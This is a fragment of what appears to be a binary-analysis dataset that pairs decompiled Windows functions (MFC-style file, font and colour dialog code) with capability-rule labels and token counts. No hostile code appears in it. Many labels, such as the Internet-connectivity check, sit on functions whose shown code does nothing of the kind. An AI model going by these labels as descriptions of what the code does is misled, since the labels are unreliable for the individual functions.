        "decompiled_code": "\nuint32_t __cdecl fcn.0042dcfa(ulong *arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    ulong *in_ECX;\n    float10 fVar2;\n    float10 fVar3;\n    \n    if ((*(in_ECX + 1) == 0) && (*(arg_8h + 1) == 0)) {\n        fVar2 = fcn.0042d350(*in_ECX);\n        fVar3 = fcn.0042d350(*arg_8h);\n        if (fVar2 <= fVar3) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = in_EAX & 0xffffff00;\n    }\n    return uVar1;\n}\n",
        "token_count": 188
    },
    "0042ddb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ddb9(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042244f(arg_8h[2]);\n    if (*arg_8h == 0) {\n        if ((arg_10h != 0) && (cVar1 = fcn.0042dcfa(arg_ch),  cVar1 != '\\0')) {\n            return;\n        }\n        if ((arg_14h != 0) && (cVar1 = fcn.0042dcb0(arg_ch),  cVar1 != '\\0')) {\n            return;\n        }\n    }\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    fcn.0042d4d7(arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 215
    },
    "0042de19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042de19(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0042244f(arg_8h[2]);\n    if (*arg_8h == 0) {\n        if ((arg_10h != 0) && (cVar1 = fcn.0042dcfa(arg_ch),  cVar1 != '\\0')) {\n            return;\n        }\n        if ((arg_14h != 0) && (cVar1 = fcn.0042dcb0(arg_ch),  cVar1 != '\\0')) {\n            return;\n        }\n    }\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    fcn.0042d7d1(arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 215
    },
    "0042e012": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042e012(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_1ch;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1001, 0, &var_1ch);\n    if (iVar1 == 0) {\n        var_4h = 0;\n        _var_ch = 0;\n        fcn.0042dc93(&var_1ch);\n        *arg_8h = var_ch;\n        arg_8h[1] = uStack12;\n        arg_8h[2] = var_4h;\n    }\n    else {\n        arg_8h[2] = (iVar1 == 1) + 1;\n    }\n    return 1;\n}\n",
        "token_count": 221
    },
    "0042e24c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042e24c(int32_t *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0042c11c(param_2);\n    iVar2 = fcn.0041e67e(uVar1);\n    if (iVar2 == 0) {\n        fcn.0041901a();\n    }\n    if (*param_1 == 0) {\n        fcn.0042d534(param_1);\n    }\n    else {\n        fcn.0042e012(param_1);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0042e7f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e7f4(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 1;\n    if (arg_ch != 0) {\n        var_18h = 0x11;\n    }\n    var_14h = arg_8h;\n    var_8h = arg_10h;\n    var_4h = arg_14h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1044, 0, &var_18h);\n    return;\n}\n",
        "token_count": 181
    },
    "0042e838": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e838(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 2;\n    if (arg_ch != 0) {\n        var_18h = 0x12;\n    }\n    var_10h = arg_8h;\n    var_8h = arg_10h;\n    var_4h = arg_14h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x1044, 0, &var_18h);\n    return;\n}\n",
        "token_count": 179
    },
    "0042e964": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e964(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x4ad214;\n    uVar3 = *0x4ad210;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0041a0f7(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 356
    },
    "0042e9f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e9f2(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x4ad214;\n    uVar3 = *0x4ad210;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.0041a08e(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 357
    },
    "0042f199": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042f199(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x40) == 0) {\n        uVar1 = fcn.0041e3b1(\"ChooseFontA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x40) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x40);\n    return;\n}\n",
        "token_count": 127
    },
    "0042f238": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0042f238(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0042f2a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042f2a1(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00426c86();\n    *(param_1 + 0x78) = uVar1;\n    iVar2 = fcn.0042f26e(param_1 + 0x74);\n    fcn.00426cc0();\n    if (iVar2 == 1) {\n        fcn.00417b17(param_1 + 0xb0, 0x3c, *(param_1 + 0x80), 0x3c);\n        iVar2 = 1;\n    }\n    else if (iVar2 == 0) {\n        iVar2 = 2;\n    }\n    return iVar2;\n}\n",
        "token_count": 180
    },
    "0042f917": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042f917(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uVar1 = fcn.0041e3b1(\"GetOpenFileNameA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x10) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x10);\n    return;\n}\n",
        "token_count": 128
    },
    "0042f9b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0042f9b6(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0042f9ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042f9ec(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x18) == 0) {\n        uVar1 = fcn.0041e3b1(\"GetSaveFileNameA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x18) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x18);\n    return;\n}\n",
        "token_count": 129
    },
    "0042fa8b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0042fa8b(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "0042faef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042faef(int32_t param_1)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(*(param_1 + 0x74) + 0x1c));\n    bVar1 = false;\n    fcn.00459330(*(*(param_1 + 0x74) + 0x1c) + iVar3 + 1, 0, *(*(param_1 + 0x74) + 0x20) - (iVar3 + 1));\n    (*_sym.imp.USER32.dll_GetFocus)();\n    iVar3 = *(param_1 + 0x74);\n    uVar4 = fcn.00426c86();\n    *(iVar3 + 4) = uVar4;\n    fcn.0041e726();\n    pcVar2 = _sym.imp.USER32.dll_EnableWindow;\n    if (*(*(param_1 + 0x74) + 4) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(*(param_1 + 0x74) + 4));\n        if (iVar3 != 0) {\n            bVar1 = true;\n            (*pcVar2)(*(*(param_1 + 0x74) + 4), 0);\n        }\n    }\n    iVar3 = fcn.0042b206();\n    if ((*(*(param_1 + 0x74) + 0x34) & 0x80000) == 0) {\n        fcn.00420922(param_1);\n    }\n    else {\n        *(iVar3 + 0x18) = param_1;\n    }\n    if (*(param_1 + 0x78) == 0) {\n        fcn.0042fad8(*(param_1 + 0x74));\n    }\n    else {\n        fcn.0042fac1();\n    }\n    *(iVar3 + 0x18) = 0;\n    if (bVar1) {\n        (*pcVar2)(*(*(param_1 + 0x74) + 4), 1);\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindow)(unaff_EBP);\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetFocus)(unaff_ESI);\n    }\n    fcn.00426cc0();\n    if (unaff_EBP == 0) {\n        unaff_EBP = 2;\n    }\n    return unaff_EBP;\n}\n",
        "token_count": 594
    },
    "0042fc91": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0042fc91(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint lpVersionInformation;\n    uint var_a0h;\n    uint var_94h;\n    uint var_4h;\n    \n    fcn.00458eae(0xa4);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0xa8) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0xb0) = extraout_ECX;\n    fcn.00426a40(0, *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = vtable.CFileDialog.0;\n    fcn.004018d0();\n    *(unaff_EBP + -4) = 1;\n    if (*(unaff_EBP + 0x20) == 0) {\n        fcn.00459330(unaff_EBP + -0xa4, 0, 0x94);\n        *(unaff_EBP + -0xa4) = 0x94;\n        (*_sym.imp.KERNEL32.dll_GetVersionExA)(unaff_EBP + -0xa4);\n        if ((*(unaff_EBP + -0x94) != 2) || (*(unaff_EBP + 0x20) = 0x58,  *(unaff_EBP + -0xa0) < 5)) {\n            *(unaff_EBP + 0x20) = 0x4c;\n        }\n    }\n    pcVar5 = fcn.004582da(*(unaff_EBP + 0x20));\n    extraout_ECX[0x1d] = pcVar5;\n    if (pcVar5 == NULL) {\n        pcVar5 = fcn.00418fe6();\n    }\n    fcn.00459330(pcVar5, 0, *(unaff_EBP + 0x20));\n    pcVar5 = *(unaff_EBP + 8);\n    uVar2 = *(unaff_EBP + 0x20);\n    extraout_ECX[0x1e] = pcVar5;\n    extraout_ECX[0x15] = 0x7005 - (pcVar5 != NULL);\n    extraout_ECX[0x71] = NULL;\n    *(extraout_ECX + 0x20) = 0;\n    ppcVar1 = extraout_ECX + 0x30;\n    *ppcVar1 = 0;\n    *extraout_ECX[0x1d] = uVar2;\n    uVar2 = *(unaff_EBP + 0xc);\n    *(extraout_ECX[0x1d] + 0x1c) = ppcVar1;\n    *(extraout_ECX[0x1d] + 0x20) = 0x104;\n    *(extraout_ECX[0x1d] + 0x3c) = uVar2;\n    uVar3 = *(unaff_EBP + 0x14);\n    *(extraout_ECX[0x1d] + 0x24) = extraout_ECX + 0x20;\n    *(extraout_ECX[0x1d] + 0x28) = 0x40;\n    *(extraout_ECX[0x1d] + 0x34) = *(extraout_ECX[0x1d] + 0x34) | uVar3 | 0x80020;\n    if ((*(unaff_EBP + 0x14) & 0x40) != 0) {\n        *(extraout_ECX[0x1d] + 0x34) = *(extraout_ECX[0x1d] + 0x34) & 0xff7fffff;\n    }\n    iVar6 = fcn.0042b7b9();\n    iVar4 = *(unaff_EBP + -0xac);\n    *(extraout_ECX[0x1d] + 8) = *(iVar6 + 0xc);\n    *(extraout_ECX[0x1d] + 0x44) = fcn.0044440b;\n    if (iVar4 != 0) {\n        fcn.00417b55(ppcVar1, 0x104, *(unaff_EBP + -0xac), 0xffffffff);\n    }\n    if (*(unaff_EBP + -0xa8) != 0) {\n        fcn.00402280(*(unaff_EBP + -0xa8));\n        puVar7 = fcn.00401940(0);\n        while( true ) {\n            puVar7 = fcn.0045c352(puVar7, 0x7c);\n            if (puVar7 == NULL) break;\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(extraout_ECX[0x1d] + 0xc) = extraout_ECX[0x1f];\n    }\n    fcn.00458f31();\n    return;\n}\n",
        "token_count": 1281
    },
    "0042fe3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: lParam\n\nvoid __cdecl fcn.0042fe3d(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint lParam;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00458e45(8);\n    uVar1 = *(*(extraout_ECX + 0x74) + 0x34);\n    *(unaff_EBP + -0x14) = 0;\n    if (((uVar1 & 0x80000) != 0) && (*(extraout_ECX + 0x20) != 0)) {\n        uVar3 = fcn.00423280();\n        fcn.00401680(uVar3);\n        *(unaff_EBP + -4) = 0;\n        uVar4 = fcn.00401940(0x104);\n        pcVar2 = _sym.imp.USER32.dll_GetParent;\n        uVar5 = *(extraout_ECX + 0x20);\n        *(unaff_EBP + -0x14) = uVar4;\n        uVar5 = (*pcVar2)(uVar5);\n        iVar6 = fcn.0041e67e(uVar5);\n        iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar6 + 0x20), 0x464, 0x104, *(unaff_EBP + -0x14));\n        if (iVar6 < 0) {\n            fcn.004016d0();\n        }\n        else {\n            fcn.00410110(uVar3, 0xffffffff);\n        }\n        if (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n            uVar3 = fcn.00401940(0x104);\n            uVar5 = *(extraout_ECX + 0x20);\n            *(unaff_EBP + -0x14) = uVar3;\n            uVar5 = (*pcVar2)(uVar5);\n            iVar6 = fcn.0041e67e(uVar5);\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar6 + 0x20), 0x465, 0x104, *(unaff_EBP + -0x14));\n            if (-1 < iVar6) {\n                fcn.00410110(0xffffffff);\n                fcn.00401920(unaff_EBP + -0x10);\n                fcn.004010d0();\n                goto code_r0x0042ff1e;\n            }\n            fcn.004016d0();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004010d0();\n    }\n    fcn.00402f40(*(*(extraout_ECX + 0x74) + 0x1c));\ncode_r0x0042ff1e:\n    fcn.00458f1d();\n    return;\n}\n",
        "token_count": 737
    },
    "0043044e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043044e(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x28) == 0) {\n        uVar1 = fcn.0041e3b1(\"ChooseColorA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x28) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x28);\n    return;\n}\n",
        "token_count": 127
    },
    "004304ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004304ed(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042abcb(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004306b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004306b1(int32_t param_1, int32_t param_2)\n\n{\n    if (param_1 != 0) goto code_r0x004306bc;\n    do {\n        param_1 = fcn.0041901a();\ncode_r0x004306bc:\n    } while (param_2 == 0);\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_1 = *(param_1 + 0x10);\n    } while (param_1 != 0);\n    return 0;\n}\n",
        "token_count": 135
    },
    "004306fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004306fe(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        iVar1 = fcn.004306e6(param_1);\n        if (iVar1 != 0) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 81
    },
    "00430b71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00430b71(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x4965a4 == *param_2) && (param_2[1] == *0x4965a8)) && (param_2[2] == *0x4965ac)) &&\n           (param_2[3] == *0x4965b0)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 457
    },
    "00430c1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00430c1f(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 294
    },
    "00430cd6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
